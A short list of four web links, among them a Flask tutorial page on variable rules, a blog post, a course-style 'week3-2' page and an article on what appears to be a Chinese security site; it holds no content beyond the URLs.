https://www.w3cschool.cn/flask/flask_variable_rules.html

https://www.cnblogs.com/yesec/p/14905799.html

https://peekaboo.show/week3-2/

https://www.anquanke.com/post/id/226900